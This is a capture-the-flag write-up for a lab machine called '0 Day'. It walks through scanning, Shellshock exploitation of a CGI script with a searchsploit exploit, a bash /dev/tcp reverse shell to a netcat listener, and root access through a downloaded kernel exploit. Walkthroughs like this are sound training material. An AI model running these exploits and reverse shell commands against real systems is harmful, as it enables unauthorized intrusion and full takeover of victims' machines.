# Welcome to my writeup for 0 Day!


## Reconnaisance and ennumeration



### Nmap scan

`nmap -p- --open -sS --min-rate 5000 -n -Pn <IP>`
![[assets/Captura de pantalla de 2025-10-01 17-51-14.png]]
`nmap -p22,80 -sCV <IP> -oN targeted`
![[assets/Captura de pantalla de 2025-10-01 17-53-45.png]]

### ffuf scan

try a simple ffuf scan for see any hidden directory.

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/FUZZ`
![[assets/Captura de pantalla de 2025-10-01 17-57-07.png]]
![[assets/Captura de pantalla de 2025-10-01 17-58-24.png]]
we have not access for cgi-bin...

### Nikto scan

Let's try a simple nikto scan.

`nikto -h <IP>`

We can see that the site /cgi-bin/test.cgi is vulnerable to shellshock, hmm, let's check.

![[assets/Captura de pantalla de 2025-10-01 18-02-55.png]]

## Gaining access


### searchsploit
with `searchsploit` let's see which vulnerabilities have.

`searchsploit shellshock`
![[assets/Captura de pantalla de 2025-10-01 18-05-29.png]]
LOL, but, there's a lot of scripts, we will use the script of apache remote code injection because on nikto we can see that the vulnaribility is from the server Aapache.
![[Captura de pantalla de 2025-10-01 18-07-16.png]]

So, let's use this exploit.
![[assets/Captura de pantalla de 2025-10-01 18-08-03.png]]

copy the script like this.
`searchsploit -m linux/remote/34900.py`

![[assets/Captura de pantalla de 2025-10-01 18-08-54.png]]
i analyze the script and we need to execute the script like this.

`python2.7 34900.py payload=reverse rhost=<IP victim machine> lhost=<IP> lport=443`

![[assets/Captura de pantalla de 2025-10-01 18-13-07.png]]

so, to get a best shell let's execute a bash script to get a shell from netcat.

### netcat

Listen with netcat on another shell.
`nc -nvlp 4444`

On the shell that we getted execute this command.
`bash -i &> /dev/tcp/<IP>/4444 0>&1`

![[assets/Captura de pantalla de 2025-10-01 18-16-34.png]]
and on the netcat we got the shell. 
![[assets/Captura de pantalla de 2025-10-01 18-18-33.png]]

### user flag

In the directory /home/ryan we have access to the flag.
![[assets/Captura de pantalla de 2025-10-01 18-19-52.png]]



## Scallin privilages


We can see that on the directory /tmp we have all the permitions, this is a good notice because we can download anything to scale privilages.

![[assets/Captura de pantalla de 2025-10-01 18-21-06.png]]

Execute `uname -a` to see the kernel version
![[assets/Captura de pantalla de 2025-10-01 18-24-06.png]]

Search in your browser and you would find an exploit in exploitDB.
![[assets/Captura de pantalla de 2025-10-01 18-24-56.png]]
Download it.

Run a server from your local machine with python.

`python3 -m http.server 80`
![[assets/Captura de pantalla de 2025-10-01 18-26-15.png]]
and on the victim machine download the file with wget.
![[assets/Captura de pantalla de 2025-10-01 18-27-29.png]]
let's compile the script like an executable.

`gcc 37292.c -o exploit`

![[assets/Captura de pantalla de 2025-10-01 18-30-38.png]]
hmmm, there's an error, maybe the path is not configurated to execute gcc, let's comprove that gcc exist.

`which gcc`
![[assets/Captura de pantalla de 2025-10-01 18-32-15.png]]
yes, maybe the PATH is not configurated to run /usr/bin, maybe if we configure this we can execute gcc and compile the sciript.

`export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:$PATH`

![[assets/Captura de pantalla de 2025-10-01 18-34-00.png]]

Try to compile the file again.
![[assets/Captura de pantalla de 2025-10-01 18-36-04.png]]
Yes, that works!
now let's execute the exploit.

`./exploit`
![[assets/Captura de pantalla de 2025-10-01 18-36-55.png]]
And we are root, so easy.

### root flag

Just cat /root/root* and get the flag.
![[assets/Captura de pantalla de 2025-10-01 18-37-44.png]]

`Thanks for watch, i wish you liked it!`
